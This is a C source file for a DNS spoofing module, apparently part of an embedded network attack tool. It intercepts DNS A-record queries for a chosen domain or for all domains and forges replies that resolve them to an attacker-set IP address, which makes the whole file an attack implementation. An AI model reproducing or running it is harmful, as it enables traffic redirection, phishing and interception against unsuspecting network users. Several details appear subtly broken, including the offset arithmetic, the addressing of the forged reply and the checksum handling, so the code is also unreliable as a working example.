#include "dns_spoof.h"
#include "config.h"
#include <string.h>

static bool s_running = false;
static uint8_t s_spoof_ip[4];
static char s_domain[64];
static bool s_all = false;

static void parse_ip(const char* str, uint8_t* ip) {
    int a,b,c,d;
    sscanf(str, "%d.%d.%d.%d", &a,&b,&c,&d);
    ip[0]=a; ip[1]=b; ip[2]=c; ip[3]=d;
}

static uint16_t csum(uint8_t* buf, int len) {
    uint32_t sum = 0;
    for (int i = 0; i < len - 1; i += 2)
        sum += (uint16_t)((buf[i]<<8) | buf[i+1]);
    if (len & 1) sum += (uint16_t)(buf[len-1]<<8);
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return ~sum;
}

static int encode_name(const char* name, uint8_t* buf) {
    int len = 0;
    const char* s = name;
    const char* dot;
    while ((dot = strchr(s, '.'))) {
        int slen = dot - s;
        buf[len++] = slen;
        memcpy(buf + len, s, slen);
        len += slen;
        s = dot + 1;
    }
    int slen = strlen(s);
    if (slen > 0) {
        buf[len++] = slen;
        memcpy(buf + len, s, slen);
        len += slen;
    }
    buf[len++] = 0;
    return len;
}

static int decode_name(const uint8_t* data, int off, int max, char* out, int outsize) {
    int pos = off, outpos = 0, jumps = 0;
    while (pos < max && jumps < 5) {
        if (data[pos] == 0) { pos++; break; }
        if ((data[pos] & 0xC0) == 0xC0) {
            pos = ((data[pos] & 0x3F) << 8) | data[pos+1];
            jumps++;
            continue;
        }
        int slen = data[pos++];
        if (slen > 63 || pos + slen > max) return -1;
        if (outpos > 0 && outpos < outsize-1) out[outpos++] = '.';
        int copy = slen;
        if (outpos + copy >= outsize) copy = outsize - outpos - 1;
        memcpy(out + outpos, data + pos, copy);
        outpos += copy;
        pos += slen;
    }
    out[outpos] = 0;
    return pos;
}

void dns_spoof_init() {
    s_running = false;
    s_all = true;
    strcpy(s_domain, "*");
    parse_ip(g_config.dns_spoof_ip, s_spoof_ip);
}

void dns_spoof_start() {
    parse_ip(g_config.dns_spoof_ip, s_spoof_ip);
    s_all = (strcmp(s_domain, "*") == 0);
    s_running = true;
}

void dns_spoof_stop() {
    s_running = false;
}

bool dns_spoof_is_running() {
    return s_running;
}

void dns_spoof_set_ip(const char* ip) {
    strncpy(g_config.dns_spoof_ip, ip, sizeof(g_config.dns_spoof_ip)-1);
    parse_ip(ip, s_spoof_ip);
}

void dns_spoof_set_domain(const char* domain) {
    strncpy(s_domain, domain, sizeof(s_domain)-1);
    s_all = (strcmp(domain, "*") == 0);
}

bool dns_spoof_process(uint8_t* ip_pkt, int ip_len, uint8_t* out, int* out_len) {
    if (!s_running) return false;
    if (ip_pkt[9] != 17) return false;
    
    int ip_hlen = (ip_pkt[0] & 0x0F) * 4;
    uint8_t* udp = ip_pkt + ip_hlen;
    int udp_len = (udp[2]<<8) | udp[3];
    if (udp[1] != 53 || udp_len < 20) return false;
    
    uint8_t* dns = udp + 8;
    int dns_len = udp_len - 8;
    
    struct __attribute__((packed)) dns_hdr { uint16_t id, flags, qd, an, ns, ar; };
    dns_hdr* h = (dns_hdr*)dns;
    if (ntohs(h->qd) == 0 || (ntohs(h->flags) & 0x8000)) return false;
    
    char qname[64];
    int name_end = decode_name(dns, 12, dns_len, qname, sizeof(qname));
    if (name_end < 0) return false;
    
    if (!s_all && strcasecmp(qname, s_domain) != 0) return false;
    
    uint16_t qtype = (dns[12+name_end]<<8) | dns[12+name_end+1];
    if (qtype != 1) return false;
    
    uint8_t src_ip[4], dst_ip[4];
    memcpy(src_ip, ip_pkt + 12, 4);
    memcpy(dst_ip, ip_pkt + 16, 4);
    uint16_t sport = (udp[0]<<8) | udp[1];
    uint16_t id = h->id;
    
    uint8_t enc[64];
    int enc_len = encode_name(qname, enc);
    if (enc_len < 0) return false;
    
    int dns_resp_len = 12 + enc_len + 4 + 2 + 16;
    int udp_total = 8 + dns_resp_len;
    int ip_total = 20 + udp_total;
    if (ip_total > 512) return false;
    
    memset(out, 0, ip_total);
    uint8_t* ip_out = out;
    ip_out[0] = 0x45;
    ip_out[2] = (ip_total >> 8) & 0xFF;
    ip_out[3] = ip_total & 0xFF;
    ip_out[8] = 128;
    ip_out[9] = 17;
    memcpy(ip_out + 12, s_spoof_ip, 4);
    memcpy(ip_out + 16, dst_ip, 4);
    uint16_t ip_csum = csum(ip_out, 20);
    ip_out[10] = (ip_csum >> 8) & 0xFF;
    ip_out[11] = ip_csum & 0xFF;
    
    uint8_t* udp_out = ip_out + 20;
    udp_out[0] = 0; udp_out[1] = 53;
    udp_out[2] = (sport >> 8) & 0xFF; udp_out[3] = sport & 0xFF;
    udp_out[4] = (udp_total >> 8) & 0xFF; udp_out[5] = udp_total & 0xFF;
    
    uint8_t* dns_out = udp_out + 8;
    dns_hdr* rh = (dns_hdr*)dns_out;
    rh->id = id;
    rh->flags = htons(0x8180);
    rh->qd = htons(1); rh->an = htons(1);
    rh->ns = 0; rh->ar = 0;
    
    int off = 12;
    memcpy(dns_out + off, enc, enc_len); off += enc_len;
    dns_out[off++] = 0; dns_out[off++] = 0; dns_out[off++] = 1;
    dns_out[off++] = 0xC0; dns_out[off++] = 0x0C;
    dns_out[off++] = 0; dns_out[off++] = 1;
    dns_out[off++] = 0; dns_out[off++] = 1;
    dns_out[off++] = 0; dns_out[off++] = 0;
    dns_out[off++] = 0; dns_out[off++] = 60;
    dns_out[off++] = 0; dns_out[off++] = 4;
    memcpy(dns_out + off, s_spoof_ip, 4);
    
    uint16_t udp_csum = csum(s_spoof_ip, 4);
    udp_csum += csum(dst_ip, 4);
    udp_csum += 0x1100 + udp_total;
    for (int i = 0; i < udp_total-1; i += 2)
        udp_csum += (uint16_t)((udp_out[i]<<8) | udp_out[i+1]);
    if (udp_total & 1) udp_csum += (uint16_t)(udp_out[udp_total-1]<<8);
    while (udp_csum >> 16) udp_csum = (udp_csum & 0xFFFF) + (udp_csum >> 16);
    udp_out[6] = (~udp_csum >> 8) & 0xFF;
    udp_out[7] = ~udp_csum & 0xFF;
    
    *out_len = ip_total;
    return true;
}
